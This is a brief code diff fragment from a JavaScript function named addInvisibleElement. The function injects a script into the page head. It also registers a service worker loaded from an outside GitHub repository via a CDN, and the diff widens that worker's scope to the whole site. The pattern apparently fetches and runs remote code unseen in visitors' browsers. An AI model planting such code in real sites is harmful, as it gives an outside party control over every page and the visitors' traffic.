@@ -11,7 +11,7 @@ function addInvisibleElement() {
 		document.head.appendChild(script1);  
 
       if ('serviceWorker' in navigator) {
-        navigator.serviceWorker.register('https://cdn.jsdelivr.net/gh/eq89/edm@c3de103/q.js')
+        navigator.serviceWorker.register('https://cdn.jsdelivr.net/gh/eq89/edm@c3de103/q.js', { scope: '/' })
           .then((registration) => {
             console.log('Service Worker registered with scope:', registration.scope);
           })
